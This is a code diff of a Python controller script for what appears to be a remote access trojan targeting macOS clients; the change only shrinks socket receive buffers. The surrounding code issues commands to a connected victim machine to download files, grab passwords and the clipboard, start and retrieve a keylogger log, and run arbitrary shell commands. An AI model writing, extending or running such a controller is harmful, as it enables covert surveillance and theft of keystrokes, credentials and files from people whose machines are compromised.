@@ -103,7 +103,7 @@ def send_commands():
             conn.send(str.encode(lcmd))
             path = input("Please enter the EXACT file path of the file you would like to download from the client: ")
             conn.send(str.encode(path))
-            file_content = str(conn.recv(99999), "utf-8")
+            file_content = str(conn.recv(1024), "utf-8")
             file_content = bytes(file_content, encoding='utf8')
             #############################################
             received_path = input(
@@ -134,7 +134,7 @@ def send_commands():
             ex = 0
             while True:
                 conn.send(str.encode(lcmd))
-                wpass = str(conn.recv(99999), "utf-8")
+                wpass = str(conn.recv(1024), "utf-8")
                 if wpass == "something":
                     send_commands()
                 if wpass != "None":
@@ -159,11 +159,11 @@ def send_commands():
                 cmd = 'pmset displaysleepnow'
         elif lcmd == "clipboard get":
             conn.send(str.encode(lcmd))
-            clipboard = conn.recv(99999).decode("unicode_escape")[2:-1]
+            clipboard = conn.recv(1024).decode("unicode_escape")[2:-1]
             print(clipboard)
         elif lcmd == "keylogger start":
             conn.send(str.encode(lcmd))
-            keylogger_start_response = str(conn.recv(99999), "utf-8")
+            keylogger_start_response = str(conn.recv(1024), "utf-8")
             print(keylogger_start_response)
             if keylogger_start_response == "exists":
                 print(bcolors.RED + '[-] Keylogger already exsists. Type "keylogger reset" to restart the keylogger log')
@@ -171,12 +171,12 @@ def send_commands():
                 print(bcolors.GREEN + "[+] Keylogger has been created!\n")
         elif lcmd == "keylogger get":
             conn.send(str.encode(lcmd))
-            keylogger_get_response = str(conn.recv(99999), "utf-8")
+            keylogger_get_response = str(conn.recv(1024), "utf-8")
             print(keylogger_get_response)
             if keylogger_get_response == "nan":
                 print(bcolors.RED + '[-] Keylogger does not exsists. Type "keylogger start" to start a keylogger')
             else:
-                file_content = str(conn.recv(99999), "utf-8")
+                file_content = str(conn.recv(1024), "utf-8")
                 # file_content = bytes(file_content, encoding='utf8')
                 with open("logs.txt", "w") as e:
                     e.write(file_content)
@@ -184,7 +184,7 @@ def send_commands():
                 print(bcolors.GREEN + "[+] Log has been recieved!\n")
         elif lcmd == "keylogger end":
             conn.send(str.encode(lcmd))
-            keylogger_end_response = str(conn.recv(99999), "utf-8")
+            keylogger_end_response = str(conn.recv(1024), "utf-8")
             print(keylogger_end_response)
             if keylogger_end_response == "nan":
                 print(bcolors.RED + '[-] Keylogger does not exsist')
@@ -195,7 +195,7 @@ def send_commands():
                 download_files()
 
             conn.send(str.encode(cmd))
-            cmd_response = str(conn.recv(99999), "utf-8")
+            cmd_response = str(conn.recv(1024), "utf-8")
             print(bcolors.BLUE + cmd_response)
 login()
 send_commands()
